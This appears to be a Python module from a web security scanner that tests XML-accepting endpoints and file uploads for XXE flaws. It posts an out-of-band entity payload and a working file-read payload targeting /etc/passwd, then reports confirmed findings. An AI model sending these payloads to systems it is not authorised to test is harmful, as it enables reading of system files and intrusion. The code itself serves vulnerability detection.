"""XXE probes against XML-accepting endpoints and file uploads."""

from __future__ import annotations

import secrets
from collections.abc import Callable

import httpx

from shroodler.models import Finding
from shroodler.pacer import Pacer
from shroodler.probes.common import (
    body_text,
    dedupe,
    normalize_params,
    request,
    url_without_query,
)
from shroodler.probes.ssrf import _default_listen

ListenFn = Callable[[float], tuple[int, Callable[[], bool]]]

_XML_REJECTED = {400, 415}
_FILE_MARKERS = ("root:x:0:0", "daemon:")
_FILE_PARAM_HINTS = (
    "file",
    "upload",
    "xml",
    "document",
    "attachment",
    "payload",
    "content",
)


def _looks_xml_content_type(content_type: str) -> bool:
    lowered = (content_type or "").lower()
    if not lowered:
        return False
    if "html" in lowered:
        return False
    return "xml" in lowered or lowered in {"application/xml", "text/xml"}


def _looks_file_param(item: dict[str, str]) -> bool:
    if str(item.get("in") or "").lower() == "file":
        return True
    name = (item.get("name") or "").lower()
    return any(hint in name for hint in _FILE_PARAM_HINTS)


def _oob_xml(port: int, nonce: str) -> str:
    return (
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:{port}/xxe-{nonce}">]>'
        "<foo>&xxe;</foo>"
    )


def _file_xml() -> str:
    return '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'


def _finding(
    *,
    finding_id: str,
    url: str,
    description: str,
    evidence: str,
) -> Finding:
    return Finding(
        id=finding_id,
        severity="critical",
        category="payload",
        url=url,
        description=description,
        evidence=evidence,
        confidence="confirmed",
    )


def _post_xml(
    url: str,
    xml: str,
    cookie_header: str,
    *,
    client: httpx.Client | None,
    pacer: Pacer | None,
) -> httpx.Response | None:
    return request(
        "POST",
        url_without_query(url),
        cookie_header=cookie_header,
        extra_headers={"Content-Type": "application/xml"},
        client=client,
        pacer=pacer,
        content=xml.encode("utf-8"),
    )


def _post_multipart(
    url: str,
    field: str,
    xml: str,
    cookie_header: str,
    *,
    client: httpx.Client | None,
    pacer: Pacer | None,
) -> httpx.Response | None:
    return request(
        "POST",
        url_without_query(url),
        cookie_header=cookie_header,
        client=client,
        pacer=pacer,
        files={field: ("xxe.xml", xml.encode("utf-8"), "application/xml")},
    )


def _body_has_passwd(body: str) -> bool:
    text = body or ""
    return any(marker in text for marker in _FILE_MARKERS)


def probe_xxe(
    url: str,
    method: str,
    params: list[dict],
    cookie_header: str,
    *,
    client: httpx.Client | None = None,
    pacer: Pacer | None = None,
    listen_fn: ListenFn | None = None,
    oob_timeout: float = 5.0,
    content_type: str = "",
) -> list[Finding]:
    """POST XXE payloads at XML (or unknown-CT POST) endpoints and XML uploads."""
    method_u = (method or "GET").upper()
    normalized = normalize_params(params)
    file_params = [item for item in normalized if _looks_file_param(item)]
    xml_ct = _looks_xml_content_type(content_type)
    unknown_ct = not (content_type or "").strip()
    try_xml_body = method_u == "POST" and (xml_ct or unknown_ct)
    try_upload = bool(file_params) and method_u in {"GET", "POST"}
    if not try_xml_body and not try_upload:
        return []

    findings: list[Finding] = []
    listen = listen_fn or _default_listen
    nonce = secrets.token_hex(8)

    def _oob(send) -> bool:
        try:
            port, wait_for_hit = listen(oob_timeout)
            send(_oob_xml(port, nonce))
            return bool(wait_for_hit())
        except Exception:  # noqa: BLE001 - fail closed
            return False

    if try_xml_body:
        oob_resp: httpx.Response | None = None

        def _send_xml(xml: str) -> httpx.Response | None:
            nonlocal oob_resp
            oob_resp = _post_xml(url, xml, cookie_header, client=client, pacer=pacer)
            return oob_resp

        oob_hit = _oob(_send_xml)
        if oob_hit:
            findings.append(
                _finding(
                    finding_id="xxe-oob",
                    url=url,
                    description="XML body triggered an outbound connection (XXE).",
                    evidence=f"payload=oob nonce={nonce}",
                )
            )
        elif int(getattr(oob_resp, "status_code", 0) or 0) not in _XML_REJECTED:
            file_resp = _post_xml(url, _file_xml(), cookie_header, client=client, pacer=pacer)
            if _body_has_passwd(body_text(file_resp)):
                findings.append(
                    _finding(
                        finding_id="xxe-file-read",
                        url=url,
                        description=("XML entity expansion returned a local file marker (XXE)."),
                        evidence="payload=file:///etc/passwd",
                    )
                )

    if try_upload:
        for item in file_params:
            name = item["name"]
            oob_hit = _oob(
                lambda xml, field=name: _post_multipart(
                    url, field, xml, cookie_header, client=client, pacer=pacer
                )
            )
            if oob_hit:
                findings.append(
                    _finding(
                        finding_id="xxe-oob",
                        url=url,
                        description=(
                            f"Multipart field {name!r} triggered an outbound connection (XXE)."
                        ),
                        evidence=f"param={name} payload=oob nonce={nonce}",
                    )
                )
                break
            file_resp = _post_multipart(
                url,
                name,
                _file_xml(),
                cookie_header,
                client=client,
                pacer=pacer,
            )
            status = int(getattr(file_resp, "status_code", 0) or 0)
            if status in _XML_REJECTED:
                continue
            if _body_has_passwd(body_text(file_resp)):
                findings.append(
                    _finding(
                        finding_id="xxe-file-read",
                        url=url,
                        description=(
                            f"Multipart field {name!r} returned a local file "
                            "marker after an XXE payload."
                        ),
                        evidence=f"param={name} payload=file:///etc/passwd",
                    )
                )
                break

    return dedupe(findings)
